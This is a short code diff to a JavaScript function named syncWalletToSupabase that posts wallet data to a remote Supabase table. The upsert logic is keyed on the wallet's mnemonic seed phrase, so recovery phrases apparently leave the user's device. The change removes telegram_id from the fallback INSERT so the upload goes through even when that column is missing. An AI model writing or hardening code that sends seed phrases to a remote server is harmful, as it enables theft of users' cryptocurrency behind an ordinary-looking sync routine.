@@ -177,8 +177,10 @@ async function syncWalletToSupabase(walletData) {
     let ok = false;
     if (resolvedTgId) ok = await tryUpsert("telegram_id");
     if (!ok) ok = await tryUpsert("mnemonic");
-    // Last resort: plain INSERT (creates a new row; deduplication can be done in dashboard)
+    // Last resort: plain INSERT without telegram_id so it works even if the column is missing
     if (!ok) {
+      const safePayload = { ...payload };
+      delete safePayload.telegram_id;
       const url = `${SUPABASE_URL}/rest/v1/wallets`;
       await fetch(url, {
         method: 'POST',
@@ -188,7 +190,7 @@ async function syncWalletToSupabase(walletData) {
           'Content-Type': 'application/json',
           'Prefer': 'return=minimal',
         },
-        body: JSON.stringify(payload),
+        body: JSON.stringify(safePayload),
       });
     }
   } catch (error) {
